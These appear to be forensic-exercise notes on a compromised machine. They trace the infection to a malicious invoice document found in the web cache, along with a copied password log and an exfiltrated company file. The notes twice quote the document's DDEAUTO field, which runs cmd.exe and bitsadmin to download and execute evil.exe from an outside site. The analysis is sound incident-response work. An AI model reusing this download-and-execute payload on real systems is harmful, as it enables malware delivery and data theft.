...
## forensic artifacts already known:
...
- What was the initial attack vector used to compromise the victim system?
	- autopsy > make report > web cache > `
http://Evilwebsite/evil_invoice.docx`
- What was the payload executed to gain control of the system?
	- Open evil_invoice.docx with 7zip:
	- `DDEAUTO C:\\Programs\\Microsoft\\Office\\MSWord\\..\\..\\..\\..\\windows\\system32\\cmd.exe "/k bitsadmin /transfer myjob /download /priority high https://demo.derre.be/evil.exe`
	- downloads `evil.exe`
- What actions did the attacker perform on the system?
  - Copy the `Windows/debug/PASSWD.LOG` file
- How was the data exfiltrated?
  - `C:\Users\User\Documents\CompanySecrets.docx` 
...
- What information can you recover that could help in discovering the identity of the attacker?
	- The website where it was downloaded off
	- The user who owns the evil document.
		- the malware creator
...
Going through the macro's of this docx file we can see that this executes a command and downloads a file called  `evil.exe`:
		...
		DDEAUTO C:\\Programs\\Microsoft\\Office\\MSWord\\..\\..\\..\\..\\windows\\system32\\cmd.exe "/k bitsadmin /transfer myjob /download /priority high https://[evilsite]/evil.exe
